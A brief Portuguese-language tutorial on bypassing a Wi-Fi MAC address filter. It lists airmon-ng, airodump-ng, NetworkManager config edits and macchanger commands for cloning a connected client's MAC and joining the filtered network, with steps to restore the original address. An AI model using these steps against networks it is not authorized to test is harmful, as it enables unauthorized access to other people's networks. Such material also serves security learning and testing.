## Bypassando filtro de mac 

#### 1° passo:

Colocar a placa em monitor mode

 ``` airmon-ng start <interface> ```

#### 2° passo:

Sniffar as redes ao redor e identificar o alvo que possui o filtro de mac e identificar os clientes conectados 

 ``` airodump-ng <interface> ```
 
#### 3° passo: 

Antes de clonar o mac para realizar o ataque, em algumas distros linux é necessario fazer alteração no arquivo de config do Netwrk Manager para permitir que o mac clonado não seja alterado automaticamente...

O arquivo pode ser encontrado nesse path: ``` /etc/NetworkManager/NetworkManager.conf ```

No arquivo de config adicione as seguintes linhas:
 ```
 [device]
 wifi.scan-rand-mac-address=no
 
 [connection]
 ethernet.cloned-mac-address=preserve
 wifi.cloned-mac-address=preserve

 ```


#### 4° passo:

Para podermos realizar a alteração do mac a placa precisa estar desativada, então primeiro desativamos ela, trocamos o mac e depois ativamos a placa novamente.

 1 - ``` ifconfig <interface> down ```
 2 - ``` macchanger -m MACADDRCLONE <interface> ```
 3 - ``` ifconfig <interface> up ```
 
#### 5° passo 

Se conectar na rede com filtro para testar se funcionou a clonagem de mac...



#### NOTE:

Para voltar o mac original usamos o macchanger com a flag -p de permanent...

 1 - ``` ifconfig <interface> down ```
 2 - ``` macchanger -p <interface> ```
 3 - ``` ifconfig <interface> up ```
